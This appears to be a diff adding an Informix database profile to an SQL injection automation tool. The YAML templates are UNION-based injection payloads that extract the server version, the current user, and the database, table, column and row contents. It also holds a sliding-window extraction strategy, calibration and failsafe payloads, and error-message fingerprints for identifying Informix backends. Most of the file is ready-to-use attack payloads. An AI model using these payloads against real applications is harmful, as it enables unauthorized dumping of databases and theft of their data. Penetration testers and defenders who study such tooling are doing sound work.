@@ -1,0 +1,133 @@
+vendor: Informix
+# jdbc:informix-sqli://fe80::1125:78c0:ef17:8ab5:7360:user=informix;password=test;INFORMIXSERVER=ol_informix1210_2
+
+resource:
+ info: |
+  select trim(
+      dbinfo('version','full')
+      || '${enclose_value_sql}'
+      || bservername
+      || '${enclose_value_sql}'
+      || user
+      || '${trail_sql}'
+  ) r
+  from table(set{1})
+
+ schema:
+  database: |
+   select
+       rr
+       || '${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.name)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct name from sysdatabases) t,
+           (select distinct name from sysdatabases) t1
+       where t.name >= t1.name
+       group by 1
+       ${limit}
+   ) a
+
+  table: |
+   select
+       rr
+       ||'${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.tabname)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct tabname from ${database}:systables) t,
+           (select distinct tabname from ${database}:systables) t1
+       where t.tabname >= t1.tabname
+       group by 1
+       ${limit}
+   ) a
+
+  column: |
+   select
+       rr
+       || '${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.colname)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t,
+           (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t1
+       where t.colname >= t1.colname
+       group by 1
+       ${limit}
+   ) a
+
+  row:
+   query: |
+    select
+        rr
+        || '${trail_sql}'
+        r
+    from (
+        select
+            '${enclose_value_sql}'
+            || trim(t.s)
+            || '${separator_qte_sql}0${enclose_value_sql}'
+            rr
+        from
+           (select distinct ${fields} s from ${database}:${table}) t,
+           (select distinct ${fields} s from ${database}:${table}) t1
+        where t.s >= t1.s
+        group by 1
+        ${limit}
+    ) a
+   fields:
+    field: trim(nvl(${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       '${lead}'
+       || substr(
+           r,
+           ${window.char},
+           32767
+       ) r
+   from (
+       ${injection}
+   ) x
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: |
+   select
+       (1337${indice}7330%2b1)
+       || '' r
+   from table(set{1})
+  calibrator: |
+   rpad(
+       '${calibrator_sql}',
+       1024,
+       '${calibrator_sql}'
+   )
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Found a quote for which there is no matching quote\. \[SQL State=
+    - "\\[Informix\\]\\[Informix ODBC Driver\\]General error\\. \\(SQLPrepare\\["
+    - Informix database
+
+ normal:
+  indices: union select ${result_range} from (${indice_unique}) b
+  capacity: "'${lead}${indice}' || ${calibrator}"
+  orderBy: order by 1337
